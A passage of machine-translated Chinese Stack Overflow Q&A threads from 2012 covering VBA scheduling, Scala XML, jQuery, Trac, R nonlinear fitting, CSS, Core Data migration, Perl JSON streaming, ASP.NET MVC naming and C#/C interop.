## 回答 #1

> 赞同：0
> 
> 时间：2012-09-17T18:03:23.597

在命令行应用程序上，我相信您必须解析来自`System.in`. 如果您只想提供初始参数，那么有一些库可以为您做到这一点，让您的生活更轻松，例如[Commons CLI](http://commons.apache.org/cli/)。如果您从命令行运行，您将把代码编译为 .jar 文件。这个库应该允许你在你的 jar 文件中为你的 java 类提供标志和命名参数。

要将文本输出到命令提示符，请使用 System.out。

# vba - 调度 2 个宏

> ID：12460035
> 
> 赞同：-2
> 
> 时间：2012-09-17T13:16:34.180
> 
> 标签：vba, excel

*（编辑：在随后的编辑中，发布者声明问题已经解决并且是由于拼写错误，然后删除了整个问题文本。添加此评论的文本恢复）*

* * *

我有 2 个需要安排的宏：

Macro1 "GetData" - 这需要每 35 分钟运行一次 - 从我的数据库中检索数据。Macro2 "RefreshData" - 这需要在 GetData 完成后每 1 分钟运行一次 - 以更新我的数据。

我试过了：

```
Private Sub workbook_open()

Application.OnTime Now + TimeValue("00:35:10"), "GetData"
Application.OnTime Now + TimeValue("00:01:00"), "RefreshData"

End Sub 
```

但是，我收到了：

“无法运行宏“c:\document and settings\alex\desktop\data.xlsm'!GetData'/此工作簿中可能不可用宏，或者所有宏都可能被禁用”

```
Sub GetData ()

'' GetData ///////////////////////////////////////////////////////////////////////

Dim sh1 As Worksheet, data As Worksheet

Set sh1 = Worksheets("Sheet1")

Set data = Workbooks.Open(Filename:="C:\Documents and Settings\alex\Desktop\source.XLS"). _
    Worksheets("Report 1")

Sheets("Report 1").Select
Set Rng = Sheets("Report 1").Range("A2:K350")
Selection.Copy

sh1.Activate
Rng.SpecialCells(xlCellTypeVisible).Copy Destination:=Sheets("Sheet1").Range("A2")

portfolioName.Activate
ActiveWorkbook.Close

End Sub

Sub RefreshData()

MsgBox ("-- Update every 1min --")

End Sub 
```

任何帮助表示赞赏。

- 更新 - - - -

我现在创建了一个单独的 GetData 模块：

```
Private Sub workbook_open()

Application.OnTime Now + TimeValue("00:35:10"), "GetData"
'Application.OnTime Now + TimeValue("00:01:00"), "RefreshData"

End Sub

Public Sub GetData()
'' GetData ///////////////////////////////////////////////////////////////////////
....
....
End Sub 
```

仍然收到相同的错误..

- 更新 - - -

好的，在 Sheet1 中我有：

```
Public Sub workbook_open()

Application.OnTime Now + TimeValue("00:35:10"), "GetData"
'Application.OnTime Now + TimeValue("00:01:00"), "RefreshData"

End Sub 
```

我现在有 Insert > Module 并将模块重命名为 GetData

在该 GetData 模块中，我有：

```
Public Sub GetData()
'' GetData ///////////////////////////////////////////////////////////////////////
....
....
End Sub 
```

欢迎任何意见

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T13:30:51.673

OnTime 要求引用的宏位于标准模块中。sub 也必须是公共的，这是模块的默认设置。插入一个模块，并将 GetData 和 RefreshData 移入其中。

# scala - 数据处理，如何处理

> ID：12460042
> 
> 赞同：0
> 
> 时间：2012-09-17T13:17:00.577
> 
> 标签：scala, haskell, functional-programming, xmlhttprequest

鉴于此 XML 数据结构，我有以下问题：

```
<level1>
 <level2ElementTypeA></level2ElementTypeA>
 <level2ElementTypeB>
   <level3ElementTypeA>String1Ineed<level3ElementTypeB>
 </level2ElementTypeB>
 ...
 <level2ElementTypeC>
    <level3ElementTypeB attribute1>
      <level4ElementTypeA>String2Ineed<level4ElementTypeA>
    <level3ElementTypeB>
 <level2ElementTypeC>
 ...
<level2ElementTypeD></level2ElementTypeD>
</level1>
<level1>...</level1> 
```

我需要创建一个实体，其中包含：String1Ineed 和 String2Ineed。

所以每次我遇到一个在attribute1中有某个值的level3ElementTypeB时，我就有了我的String2Ineed。难看的部分是如何获取String1Ineed，它位于当前level2ElementTypeC之上的level2ElementTypeB类型的第一个元素。

我的“命令式”解决方案看起来像我总是保留一个带有 String1Ineed 最后一个值的变量，如果我达到 String2Ineed 的标准，我只需使用它。如果我们从一个简单的集合处理的角度来看这个。您将如何对 String1Ineed 和 String2Ineed 之间的回溯逻辑进行建模？使用状态单子？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-09T06:54:32.273

这不是 XPATH 的用途吗？您可以找到 String2Ineed，然后更改轴以重新搜索 String1Ineed。

# javascript - jQuery - 如果 array.filter 失败显示消息？

> ID：12460048
> 
> 赞同：1
> 
> 时间：2012-09-17T13:17:08.280
> 
> 标签：javascript, jquery, arrays, array-filter

我正在制作一个 jQuery 控制台，并且我正在使用一个填充了可用命令的数组来验证用户的输入——例如，如果他们输入`help`, if `help`is in `array.name`，则继续执行下一段代码。

`filter`问题是我想在完全失败时显示一条消息，例如“该命令不存在” ，因为 in`help`根本不在数组中。到目前为止，这是我的代码：

```
var commands = [
    {   'name': 'help',
        'desc': 'display information about all available commands or a singular command',
        'args': 'command-name' },
    {   'name': 'info',
        'desc': 'display information about this console and its purpose' },
    {   'name': 'authinfo',
        'desc': 'display information about me, the creator' },
    {   'name': 'clear',
        'desc': 'clear the console' },
    {   'name': 'opensite',
        'desc': 'open a website',
        'args': 'url' },
    {   'name': 'calc',
        'desc': 'calculate math equations',
        'args': 'math-equation' },
    {   'name': 'instr',
        'desc': 'instructions for using the console' }
];

function detect(cmd) { // function takes the value of an <input> on the page
    var cmd = cmd.toLowerCase(); // just in case they typed the command in caps (I'm lazy)

    commands.filter(function(command) {
        if(command.name == cmd) {
            switch(cmd) {
                // do stuff
            }
        }
        else {
            alert("That command was not found."); // this fires every time command.name != cmd
        }
    }
} 
```

如果需要，我有一个带有（几乎）所有代码的 jsFiddle。

[http://jsfiddle.net/abluescarab/dga9D/](http://jsfiddle.net/abluescarab/dga9D/)

每次找不到命令名称时，else 语句都会触发 - 这很多，因为它正在循环遍历数组。

如果在使用时在数组中的任何位置都找不到命令名称，有没有办法显示消息`filter`？

在此先感谢，如果我没有意义并为代码墙道歉，我愿意接受有关替代方法的建议。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T13:33:14.880

```
function get_command(command_name) {

    var results = {};
    for (var key in commands) (function(name, desc, command) {

        if (name == command_name) (function() {

            results = command;
        }());

    }(commands[key]["name"], commands[key]["desc"], commands[key]));

    return (results);
};

get_command("help"); 
```

而不是 switch 是尝试过滤方法功能：

```
commands.filter = (function(command, success_callback, fail_callback) {

    if (get_command(command)["name"]) (function() {

       success_callback();
    }());

    else (function() {

        fail_callback();
    }());
});

commands.filter("help", function() {

    console.log("enter help command source :)");
}, function() {

    console.log("hey help command???");
}); 
```

别紧张。

# trac - trac 路线图进度条

> ID：12460050
> 
> 赞同：0
> 
> 时间：2012-09-17T13:17:32.630
> 
> 标签：trac

我最近将一个 trac 项目迁移到一台新机器上，现在没有显示路线图进度条。我尝试在 Admin -> General -> Plugins -> Trac 0.12.3 菜单下启用和禁用 RoadmapModule。我还检查了项目文件 trac.ini 包含：

```
[milestone]
stats_provider = DefaultTicketGroupStatsProvider 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-17T22:02:13.170

只有进度条？比我猜这是CSS的问题。

仔细检查，即您具有适当的读取权限并且不会干扰`style.css`您的`<env>/htdocs`目录。

或者您遇到插件问题，正如后面的评论所暗示的那样。禁用任何插件应该会让您再次进入工作状态。从那里您可以逐步启用插件以查找干扰代码，并可能查找固定/更新的插件代码。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-18T09:31:46.510

原来它缺少插件导致兼容性问题。

```
sudo easy_install -U -Z http://trac-hacks.org/svn/typedticketworkflowplugin/0.11 
```

# r - 非线性方程 R

> ID：12460051
> 
> 赞同：0
> 
> 时间：2012-09-17T13:17:35.693
> 
> 标签：r, sas, nonlinear-functions

我喜欢拟合一个非线性方程（g 和 h 是参数）：

> q = g * (h**age)/(1 + g * (h**age));
> 当年龄 = 50 时限制 q = .05：即 g * (h* *50)/(1 + g* (h**50)= .05。
> 这意味着当年龄 = 50 时，预测值 q 等于数据中的 q。

谢谢你的帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-17T13:30:49.230

看看 `nls()` 和/或包装`BB`。但是为了真正的乐趣:-)，花一点时间在 Eureqa，[http://creativemachines.cornell.edu/eureqa](http://creativemachines.cornell.edu/eureqa)。您将获得比您想象的更多的解决方案！

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-17T13:58:27.153

```
#define function
qfun <- function(age,h){
  #the constraint can be added using algebra
  g <- 0.05/0.95/h^50 
  g * (h^age)/(1 + g * (h^age))
}     

#create data
age <- 1:75

h <- 0.75

q <- qfun(age,h) 
plot(q~age)
#add noise
q <- q+rnorm(length(q),sd=0.02)
plot(q~age)

#fit
fit <- nls(q~qfun(age,h),start=list(h=1))
summary(fit)
Formula: q ~ qfun(age, h)

#Parameters:
#  Estimate Std. Error t value Pr(>|t|)    
#h 0.749644   0.001678   446.7   <2e-16 ***
#---
#Signif. codes:  0 ‘***’ 0.001 ‘**’ 0.01 ‘*’ 0.05 ‘.’ 0.1 ‘ ’ 1 
#
#Residual standard error: 0.01865 on 74 degrees of freedom
#
#Number of iterations to convergence: 5 
#Achieved convergence tolerance: 1.735e-06 
ttt<- function(x) qfun(x,coef(fit)[1])
curve(ttt,from=1,to=75,add=TRUE) 
```

# jquery - 如何使用绝对定位的子级（不是重复）设置父级 div 的 100% 高度？

> ID：12460054
> 
> 赞同：1
> 
> 时间：2012-09-17T13:17:47.800
> 
> 标签：jquery, html, css, height, css-position

假设一个例子：

```
<!DOCTYPE HTML>
<html lang="en-US">
<head>
    <meta charset="UTF-8">
    <style type="text/css">
        html, body  { height:100%; width:100%; padding:0; margin:0; }
        body        { overflow:scroll; }
        #wrapper    { background:#5f9ea0; width:500px; height:100%; min-height:100%; margin:0 auto; overflow:auto; }
        #content    { background:#336699; width:400px; height:100%; min-height:100%; margin:0 auto; overflow-x:hidden; position:relative;}
        #info-block { background:#d2691e; width:300px; left:20px; position:absolute; }
    </style>
</head>
<body>
    <div id="wrapper">
        <div id="content">
            <div id="info-block">Info..<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>...End</div>
        </div>
    </div>
</body>
</html> 
```

这个例子有几个问题：

1.  它将滚动条放入错误的位置，`#content`而不是`body`.
2.  ,`body`也`#wrapper`没有`#content`计算出合适的高度。预期是`522px`而不是`227px`. （下面的屏幕截图）。

![实际内容高度为 522px](../Images/6667f5bc54f0c12f07e6d792dcb78d20.png) ![计算的高度是227px，这是错误的](../Images/ff05fab0fd557b06c19e4389e7ae8163.png)

`#info-block`所以实际的问题是我需要页面来获取元素内容的高度。试过可能不同的设置，都失败了。

一种可行的解决方案 - 使用 jQuery 并将 的高度与`#info-block`的高度进行比较`body`，并将其递归地应用于`body`,`#wrapper`和`#content`. 但这是错误的。寻找仅 CSS 的解决方案。

而且，我不能摆脱元素的`position:absolute`属性`#info-block`，因为它是交互式水平手风琴的一部分。

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-17T13:29:05.003

在另一个 Stackoverflow 线程中提出了类似的问题，我将链接该线程以供您查看。

[最小高度为 100% 的父级内部的子级不继承高度](https://stackoverflow.com/questions/8468066/child-inside-parent-with-min-height-100-not-inheriting-height)

似乎您不能在 Chrome/Safari/Firefox 中以最小高度继承高度。也许这就是问题所在？线程中有jQuery问题解决，以及有人报告显示：块；应该解决问题。

看一看！

# ios - iOS 应用程序数据库中的 10 个核心数据表，如何将它们全部复制到一个新的单个表中？

> ID：12460055
> 
> 赞同：0
> 
> 时间：2012-09-17T13:17:51.903
> 
> 标签：ios, core-data, data-migration

我有一个管理 10 个不同实体的核心数据应用程序。它们基本上都是相同的，并且具有相同的属性。（NSStrings 和 UIImage）这会产生一个包含 10 个表的 sqlite DB：

```
Collection A table
-item with attributes xyz
-item with attributes xyz
-item with attributes xyz
Collection B table
-item with attributes xyz
-item with attributes xyz
-item with attributes xyz
etc, etc 
```

我现在意识到这是一个不好的方法。我最终得到了 10 个不同的视图控制器和 10 个不同的 FRC。我应该把所有东西都放在一个带有“collectionX”属性的表中。这样，我将所有集合项都放在一个表下，并且根据用户所在的集合，我可以使用“collectionX”属性从 FRC 中返回这些项目，并带有谓词。

我想做的是将所有内容迁移到一个表中并为集合名称添加一个属性：

```
Collection table
-item from collection A (w/new "collectionX" attribute filled in as "collectionA")
-item from collection A (w/new "collectionX" attribute filled in as "collectionA")
-item from collection A (w/new "collectionX" attribute filled in as "collectionA")
-item from collection B (w/new "collectionX" attribute filled in as "collectionB")
-item from collection B (w/new "collectionX" attribute filled in as "collectionB")
-item from collection B (w/new "collectionX" attribute filled in as "collectionB")
etc, etc 
```

因此，通过轻量级迁移，我应该能够进入所有 10 个实体并添加新的“collectionX”属性并使用关联集合的字符串填充它。

现在是困难的部分......我现在如何获取每个表中的所有条目并将它们全部复制到一个新表中并删除旧的 10 个表？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-17T14:23:44.383

如果我从 N 个数据库迁移到单个数据库，我什至不知道我会迈出第一步。

相反，在应用程序启动时，我会寻找“新”数据库。如果它不存在，那么我会寻找其他数据库，然后启动后台更新。

在该后台线程中，为新数据库创建一个完整的核心数据堆栈，然后遍历每个旧数据库。使用线程限制创建所有 MOC，以便更轻松地使用线程。

对于每个“旧”数据库，查询所有对象，然后遍历每个对象，将其值分配给新数据库中新插入的对象。

如果您的所有实体都具有相同的名称，那就小菜一碟。如果没有，那么您可以从 NSEntityDescription 中获取属性名称，然后遍历属性。使用 KVC（即，`valueForKey:`使`setValue:forKey:`为新对象设置适当的值变得容易。然后，分配适当的类别。

完成所有对象的循环后，您现在在“新”数据库中有重复的数据库，因此您可以删除旧的。关闭“新”数据库，然后通过正常的初始化阶段来创建所使用的数据库

如果您有大量数据，并希望应用程序在迁移时正常运行，您甚至可以让应用程序在后台执行更新时使用旧数据文件运行。更新完成后，您可以进行交换。

**编辑**

> “循环遍历每个旧数据库”是什么意思？如何有效地“剪切和粘贴”所有这些数据？– 黑麦MAC3

正是这样。遍历 10 个数据库中的每一个。就像是：

```
for (NSString *dbName in databaseNames) {
    // Create a Core Data stack for the old database
    NSManagedObjectContext *oldDatabaseMOC = ...
    // Now, fetch objects from that database and insert new ones into the new database
} 
```

# json - 如何从文件中流式传输 JSON？

> ID：12460058
> 
> 赞同：8
> 
> 时间：2012-09-17T13:18:02.667
> 
> 标签：json, perl, stream

我将有一个可能非常大的 JSON 文件，我想从中流式传输而不是将其全部加载到内存中。根据来自 的以下陈述（我添加了重点）[`JSON::XS`](http://search.cpan.org/dist/JSON-XS/XS.pm#INCREMENTAL_PARSING)，我相信它不适合我的需要。是否有一个 Perl 5 JSON 模块可以从磁盘流式传输结果？

> 在某些情况下，需要对 JSON 文本进行增量解析。虽然此模块**必须同时将 JSON 文本和生成的 Perl 数据结构同时保存在内存中**，但它确实允许您以增量方式解析 JSON 流。它通过累积文本来做到这一点，直到它有一个完整的 JSON 对象，然后它可以对其进行解码。这个过程类似于使用 decode_prefix 来查看一个完整的 JSON 对象是否可用，但是效率更高（并且可以用最少的方法调用来实现）。

为了澄清，JSON 将包含一个对象数组。我想一次从文件中读取一个对象。

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-09-17T15:08:42.977

在易用性和速度方面，[`JSON::SL`](http://search.cpan.org/perldoc?JSON%3A%3ASL)似乎是赢家：

```
#!/usr/bin/perl

use strict;
use warnings;

use JSON::SL;

my $p = JSON::SL->new;

#look for everthing past the first level (i.e. everything in the array)
$p->set_jsonpointer(["/^"]);

local $/ = \5; #read only 5 bytes at a time
while (my $buf = <DATA>) {
    $p->feed($buf); #parse what you can
    #fetch anything that completed the parse and matches the JSON Pointer
    while (my $obj = $p->fetch) {
        print "$obj->{Value}{n}: $obj->{Value}{s}\n";
    }
}

__DATA__
[
    { "n": 0, "s": "zero" },
    { "n": 1, "s": "one"  },
    { "n": 2, "s": "two"  }
] 
```

[`JSON::Streaming::Reader`](http://search.cpan.org/perldoc?JSON%3A%3AStreaming%3A%3AReader)没问题，但它速度较慢，并且接口过于冗长（所有这些代码引用都是必需的，即使很多什么都不做）：

```
#!/usr/bin/perl

use strict;
use warnings;

use JSON::Streaming::Reader;

my $p = JSON::Streaming::Reader->for_stream(\*DATA);

my $obj;
my $attr;
$p->process_tokens(
    start_array    => sub {}, #who cares?
    end_array      => sub {}, #who cares?
    end_property   => sub {}, #who cares?
    start_object   => sub { $obj = {}; },     #clear the current object
    start_property => sub { $attr = shift; }, #get the name of the attribute
    #add the value of the attribute to the object
    add_string     => sub { $obj->{$attr} = shift; },
    add_number     => sub { $obj->{$attr} = shift; },
    #object has finished parsing, it can be used now
    end_object     => sub { print "$obj->{n}: $obj->{s}\n"; },
);

__DATA__
[
    { "n": 0, "s": "zero" },
    { "n": 1, "s": "one"  },
    { "n": 2, "s": "two"  }
] 
```

解析 1,000 条记录需要`JSON::SL`0.2 秒和`JSON::Streaming::Reader`3.6 秒（请注意，`JSON::SL`一次输入 4k，我无法控制 JSON::Streaming::Reader 的缓冲区大小）。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-17T13:49:14.850

您是否查看过在 search.cpan.org 上搜索“JSON Stream”时首先显示的[JSON::Streaming::Reader ？](http://search.cpan.org/perldoc?JSON%3A%3AStreaming%3A%3AReader)

或者通过搜索“JSON SAX”找到[JSON::SL](http://search.cpan.org/perldoc?JSON%3A%3ASL) - 不是很明显的搜索词，但您描述的内容听起来像是 XML 的 SAX 解析器。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-09-17T13:22:19.467

> 它通过累积文本来做到这一点，直到它有一个完整的 JSON 对象，然后它可以对其进行解码。

这就是让你崩溃的原因。JSON 文档**是**一个对象。

您需要更清楚地定义增量解析所需的内容。您是否正在寻找大型映射的一个元素？你想用你读/写的信息做什么？

* * *

我不知道任何库会通过一次从数组中读取一个元素来增量解析 JSON 数据。但是，使用有限状态自动机实现自己非常简单（基本上，您的文件具有格式`\s*\[\s*([^,]+,)*([^,]+)?\s*\]\s*`，除了您需要正确解析字符串中的逗号。）

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-09-17T13:43:04.797

您是否尝试先跳过右括号`[`，然后跳过逗号`,`：

```
$json->incr_text =~ s/^ \s* \[ //x;
...
$json->incr_text =~ s/^ \s* , //x;
...
$json->incr_text =~ s/^ \s* \] //x; 
```

就像在第三个例子中一样： [http ://search.cpan.org/dist/JSON-XS/XS.pm#EXAMPLES](http://search.cpan.org/dist/JSON-XS/XS.pm#EXAMPLES)

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-06-14T10:29:26.747

如果您可以控制生成 JSON 的方式，那么我建议关闭漂亮的格式并每行打印一个对象。这使得解析变得简单，如下所示：

```
use Data::Dumper;
use JSON::Parse 'json_to_perl';
use JSON;
use JSON::SL;
my $json_sl = JSON::SL->new();
use JSON::XS;
my $json_xs = JSON::XS->new();
$json_xs = $json_xs->pretty(0);
#$json_xs = $json_xs->utf8(1);
#$json_xs = $json_xs->ascii(0);
#$json_xs = $json_xs->allow_unknown(1);

my ($file) = @ARGV;
unless( defined $file && -f $file )
{
  print STDERR "usage: $0 FILE\n";
  exit 1;
}

my @cmd = ( qw( CMD ARGS ), $file );
open my $JSON, '-|', @cmd or die "Failed to exec @cmd: $!";

# local $/ = \4096; #read 4k at a time
while( my $line = <$JSON> )
{
  if( my $obj = json($line) )
  {
     print Dumper($obj);
  }
  else
  {
     die "error: failed to parse line - $line";
  }
  exit if( $. == 5 );
}

exit 0;

sub json
{
  my ($data) = @_;

  return decode_json($data);
}

sub json_parse
{
  my ($data) = @_;

  return json_to_perl($data);
}

sub json_xs
{
  my ($data) = @_;

  return $json_xs->decode($data);
}

sub json_xs_incremental
{
  my ($data) = @_;
  my $result = [];

  $json_xs->incr_parse($data);  # void context, so no parsing
  push( @$result, $_ ) for( $json_xs->incr_parse );

  return $result;
}

sub json_sl_incremental
{
  my ($data) = @_;
  my $result = [];

  $json_sl->feed($data);
  push( @$result, $_ ) for( $json_sl->fetch );
  # ? error: JSON::SL - Got error CANT_INSERT at position 552 at json_to_perl.pl line 82, <$JSON> line 2.

  return $result;
} 
```

# asp.net-mvc - ASP.NET MVC 控制器命名多元化

> ID：12460060
> 
> 赞同：100
> 
> 时间：2012-09-17T13:18:13.240
> 
> 标签：asp.net-mvc, naming-conventions, pluralize, asp.net-mvc-controller

RESTful 约定表示在单数对象上使用复数名词。

命名 ASP.NET MVC 控制器的复数约定是什么，即
`ProductController`or `ProductsController`？

* * *

## 回答 #1

> 赞同：194
> 
> 时间：2015-08-12T15:03:48.590

我将不得不不同意以前使用复数或单数并保持一致的答案。每个控制器都应该根据它们是与单个实体还是多个实体交互来使用不同的约定。特别是因为默认情况下在 URL 中使用控制器名称。

虽然项目模板使用单数（HomeController、AccountController），但只有一个 Home，并且 Account 操作仅对会话的单个帐户进行操作。我不希望 /homes 的 URL 访问主页，也不希望转到 /accounts 来管理我的帐户设置。

复数 HomesController适用于具有与列出和搜索多个房屋相关的**方法**的房地产网站：/homes/new-listings。

* * *

## 回答 #2

> 赞同：48
> 
> 时间：2012-09-17T15:45:24.163

一些 MVC 框架使用复数，但是 MVC 项目模板包含一个名为 AccountController 的控制器，因此建议使用单数命名。

没关系。与 Asp.net MVC 框架中的大多数内容一样，选择权在您手中。没有真正的约定。

这是我个人的意见，但重要的是你选择一个方案并保持一致！

* * *

## 回答 #3

> 赞同：13
> 
> 时间：2014-04-23T14:58:43.107

当您使用 MVC 脚手架为实体框架实体添加控制器时，VS2013 将控制器名称设为复数，因此我建议使用使实体控制器复数的默认值。

更新：我改变了主意。大声是正确的。这取决于控制器的上下文。

# c# - 在 C# 中使用 shell 命令

> ID：12460062
> 
> 赞同：0
> 
> 时间：2012-09-17T13:18:20.103
> 
> 标签：c#, process, cmd

我有下面的代码，我使用 DevCon.exe 捕获某些内容并将其写入文件中。我根据需要解析这个文件。

```
Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.Arguments = "/C devcon.exe find = port *monitor* > monitor_Details.txt";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = true;
p.StartInfo.Verb = "runas";
p.Start(); 
```

不幸的是，使用此代码，我没有看到创建任何文本文件。因此，尽管我提到了这里不考虑 shell 命令。相同的命令在 CMDLine 中工作。

任何人都可以帮忙看看出了什么问题吗？

我也尝试了下面的代码，但它不起作用。

```
Process p = new Process();
p.StartInfo.FileName = "devcon.exe";
p.StartInfo.Arguments = "find = port *monitor* > monitor_Details.txt";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = true;
p.StartInfo.Verb = "runas";
p.Start(); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-17T13:22:25.753

您可以添加这些行 - 基于`RedirectStandardOutput`

```
p.StartInfo.RedirectStandardOutput = true;
.....
p.Start();
string result = p.StandardOutput.ReadToEnd(); 
```

链接：http: [//msdn.microsoft.com/fr-fr/library/system.diagnostics.processstartinfo.redirectstandardoutput.aspx](http://msdn.microsoft.com/fr-fr/library/system.diagnostics.processstartinfo.redirectstandardoutput.aspx)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-05-26T04:02:59.180

我有同样的问题。一种解决方法是为进程提供用户名和密码参数以及“runas”动词。这将使新进程启动并能够读取/写入文件。我没有明确的解释，但它对我有用。

```
p.StartInfo.Verb = "runas";
p.StartInfo.UserName = Environment.UserName;
p.StartInfo.Password = PromptUserPassword(); //Get password as SecureString 
```

# c# - 具有 2 种不同对象类型的列表

> ID：12460065
> 
> 赞同：1
> 
> 时间：2012-09-17T13:18:29.703
> 
> 标签：c#, .net, interface

我有 2 个实体，“交易”和“商店”。我想将这些组合在一个列表中，以及一个整数或其他指示类型的东西。

我做了一些谷歌搜索并提出了一个解决方案，但由于它非常新且令人困惑，我不确定它是否是最好的解决方案。

我已经使用了一个界面来执行此操作 - 下面的代码，我很感激一些关于这是否是正确和合理的方法的建议。

```
public interface IBookmarkWrapper
{
    int DataType { get; private set; }
    object Data { get; private set; }
}

public class DealBookmarkWrapper : IBookmarkWrapper
{
    public int DataType { get; private set; }
    public object Data { get; private set; }

    public DealBookmarkWrapper(Deal deal)
    {
        deal.ThrowNull("deal");

        DataType = 1;
        Data = deal;
    }
} 
```

并在使用中：

```
 var list = new List<IBookmarkWrapper>();
    list.Add(new DealBookmarkWrapper(deal)); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-17T20:10:42.870

您是否考虑过使用 C# [Struct](http://msdn.microsoft.com/en-us/library/aa288471%28v=vs.71%29.aspx)？

```
struct DealBookmarker
    {
        public Deal Dl;
        public Store St;
        public int Type;
    }
List<DealBookmarker> DBM = new List<DealBookmarker>();

DBM.add(new DealBookmarker) 
```

如有必要，您还可以向 Struct 添加构造函数

与作为 ref 类型的类不同，结构是值类型，它允许您创建行为类似于内置数据类型的对象，因为它是在堆栈而不是堆上启动的，它会产生性能提升。

在这种情况下，在类上使用 struct 的好处：

1.  更好的性能
2.  通过值而不是引用传递
3.  可以有一个构造函数（必须参数化）
4.  仍然可以实现一个接口
5.  和我最喜欢的简单版！！！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-17T21:59:49.133

如果您打算在转发器中使用它（我希望您实际上是指 ListView），那么只需在接口中定义您的属性，然后在 Deal 和 Store 类中实现接口。然后您可以将列表绑定到转发器/列表视图并按名称调用属性。不需要任何诡计。通过这样做，接口保证您的属性可用（否则 DataTextvalue 将在绑定期间中断）。

换句话说，如果您要绑定到 ListView，则显示属性需要在 Store 和 Deal 类中命名相同。因此，您不妨以最基本的形式使用该接口：

```
protected Page_Load(object sender, EventArgs e)
{
    var list = new List<IWatchamacallit>();
    list.Add(new Store { Property1 = "Store1", Property2 = "StoreInfo"});
    list.Add(new Store { Property1 = "Store2", Property2 = "StoreInfo" });
    list.Add(new Deal { Property1 = "Deal1", Property2 = "DealInfo" });
    list.Add(new Deal { Property1 = "Deal2", Property2 = "DealInfo" });

    myListView.DataSource = list;
    myListView.DataBind();

    /*  from here just set your page controls to call the properties
        for instance:
            <asp:Label Text='<%# Eval("Property1") %>' />
            <asp:Label text='<%# Eval("Property2") %>' />   
    */
}

public interface IWatchamacallit
{
    string Property1 { get; set; }
    string Property2 { get; set; }
}

public class Store : IWatchamacallit
{
    public string Property1 { get; set; }
    public string Property2 { get; set; }
}

public class Deal : IWatchamacallit
{
    public string Property1 { get; set; }
    public string Property2 { get; set; }
} 
```

您的输入将绑定看起来像：

```
Property1   Property1
=====================
Deal1       DealInfo
Deal2       DealInfo
Store1      StoreInfo
Store2      StoreInfo 
```

您需要保留的任何其他值（如 dealId 或 storeId）都可以作为属性添加到您的类中。只需确保在界面中定义它们并使用一致的命名即可。通过这样做，您可以在保持类结构的同时用两种不同的类型填充列表。如果您稍后需要从列表中选择它们，您可以像这样抛出：

```
foreach (var item in list)
{
    var tempContainer = Activator.CreateInstance(item.GetType());
    tempContainer = item;
} 
```

或其他几种方式中的任何一种，具体取决于您要完成的工作。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-17T13:38:38.040

你可以实现`Factory method`（GOF的模式）

链接： http: [//www.dofactory.com/Patterns/PatternFactory.aspx](http://www.dofactory.com/Patterns/PatternFactory.aspx)

注意：

“交易”和“商店”是您的`Concrete Product`

IBookmarkWrapper 是你的`Product`

并定义`Creator`

# c# - C# 从 C malloc 中释放 IntPtr

> ID：12460069
> 
> 赞同：1
> 
> 时间：2012-09-17T13:18:39.730
> 
> 标签：c#, c, char, marshalling, intptr

我在 C 上有一个带有 func 的非托管 DLL：

```
char* My_Func(char* data, int input_length, int output_length); 
```

在这个函数中我有

```
result = (char*)malloc(output_lenght);
strcpy(result,test_char);
return(result); 
```

在 C# 中我导入它

```
[DllImport(@"libsmev.DLL", CharSet = CharSet.Ansi)]
public static extern IntPtr My_Func([MarshalAs(UnmanagedType.LPStr)]string data, int input_length, out int output_length); 
```

并称它为

```
IntPtr result = My_Func (n1, n1.Lenght,n2); 
```

如何释放 char* 或 IntPtr？

Marshal.FreeHGlobal(IntPtr) 和 Marshal.FreeCoTaskMem(IntPtr) 不起作用。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-17T13:20:36.473

您需要导出一个可以使用`free`. 正如您所注意到`Marshal.FreeHGlobal`的并且`Marshal.FreeCoTaskMem`不起作用，因为这些函数需要使用不同分配函数分配的指针。

如果您创建一个分配内存并返回指向该内存的指针的 API，您还必须在 API 中添加一个函数来释放内存。否则，您的 API 在用于分配内存的库（在本例中为 C 标准库）之外将不可用。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-17T13:26:21.907

在 C 中，是这样的：

```
void Free_Obj(char* obj) {
    free(obj);
} 
```

在 C# 中，是这样的：

```
[DllImport("libsmev.DLL")]
public static extern void Free_Obj(IntPtr obj); 
```

并称之为：

```
IntPtr result = My_Func (n1, n1.Lenght,n2);
Free_Obj(result); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-17T13:29:55.380

在您的 DLL 中创建自定义自由函数时，您还可以使用[CoTaskMemAlloc 来](http://msdn.microsoft.com/en-us/library/windows/desktop/ms692727%28v=vs.85%29.aspx)代替`malloc`分配内存。

然后，您可以使用`Marshal.FreeCoTaskMem`它来释放它。

# alfresco - 如何正确设置 onDeleteAssociationPolicy？

> ID：12460070
> 
> 赞同：1
> 
> 时间：2012-09-17T13:18:40.997
> 
> 标签：alfresco

我有自定义内容类型，它具有目标关联。我想设置一个策略，在删除关联时执行一些操作。我写了这个策略，就像我通常写另一个策略一样，但由于某种原因它不起作用。我在 OnDeleteAssociationPolicy 实现中的 init() 如下所示：

```
policyComponent.bindClassBehaviour(
    QNAME,
    PublishModel.pubWebContent,
